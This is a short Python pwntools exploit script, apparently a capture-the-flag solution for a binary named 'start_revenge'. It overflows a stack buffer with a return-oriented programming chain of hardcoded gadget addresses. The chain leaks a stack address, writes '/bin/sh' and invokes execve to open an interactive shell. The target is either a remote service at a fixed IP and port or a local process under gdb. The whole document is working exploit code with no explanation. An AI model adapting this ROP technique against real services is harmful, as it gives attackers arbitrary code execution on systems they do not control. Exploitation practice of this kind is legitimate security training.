from pwn import *
import time
import sys


def exploit(proc):
    xor_rdi_rax_sys = 0x000000000040011c
    pop_rsi_rdx = 0x00000000004000aa
    pop_rdx = 0x00000000004000ab
    pop_rax = 0x0000000000400114
    pop_rdi_rsi_rdx = 0x00000000004000a9
    inc_rdi_rax_syscall = 0x00000000004000b9
    syscall = 0x00000000004000bf
    magic = 0x4000c2
    buf = '/bin/sh\x00'
    buf += 'A' * (56 - len(buf))
    # 0x70
    buf += flat([pop_rdx, 0x70, pop_rax, 0, inc_rdi_rax_syscall, magic])
    proc.recvuntil('Shell we play a game ?')
    proc.recv()
    proc.sendline(buf)
    print '---'
    stack = u64(proc.recv(0x70)[-8:])
    buf = 'A' * 56
    buf += flat([pop_rsi_rdx, stack, 8, xor_rdi_rax_sys, magic])#pop_rax, 0x3b, pop_rdi_rsi_rdx, stack, 0, 0, syscall])
    proc.recvuntil('Shell we play a game ?')
    proc.recv()
    raw_input('wait')
    proc.sendline(buf)
    proc.send('/bin/sh\x00')
    buf = 'A' * 56
    buf += flat([pop_rax, 0x3b, pop_rdi_rsi_rdx, stack, 0, 0, syscall])
    raw_input('wait')
    proc.sendline(buf)


if __name__ == '__main__':
    context.arch = 'amd64'
    if len(sys.argv) > 1:
        proc = remote('10.13.2.43', 20739)
    else:
        proc = process('./start_revenge')
        gdb.attach(proc, '''
        set follow-fork-mode child
        b *main+0x01
        b *magic+27
        continue
        ''')
    exploit(proc)
    proc.interactive()
